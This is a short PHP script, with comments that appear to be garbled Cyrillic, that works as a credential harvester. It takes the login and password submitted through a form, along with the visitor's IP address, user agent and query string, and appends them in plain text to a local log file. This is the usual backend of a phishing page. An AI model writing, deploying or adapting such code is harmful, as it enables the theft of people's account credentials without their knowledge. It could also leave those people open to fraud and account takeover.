<?
$file="file2.txt"; //���� ���� ���������� ���
$data=date("d.m.Y H:i"); //� ������� �������� ������ ����������� ���� D - ���� ������, M - ����� Y - ���, ������� h - ����, i - ������  
$ip=trim($_SERVER['REMOTE_ADDR']); //ip
$sysinfo=trim($_SERVER['HTTP_USER_AGENT']); //����� ������ ����������
$query=$_SERVER['QUERY_STRING']; //�������� GET
$login = $_POST[login]; //����� POST
$pass = $_POST[pass]; //����� POST
if(is_file($file)){ //��������� ������� ����� � ����������� ������ � ��� 
$fo=fopen($file,"a+"); //��������� ���� �� ������ � ����� 
$res="\n$data  |  $ip  |  $sysinfo | \nlogin=$login  password=$pass \n$query \n"; //��������� ������ � ����������� �� ������ 
$fw=fwrite($fo,$res); //���������� � ���� 
fclose($fo); //��������� ���� 
} 
?>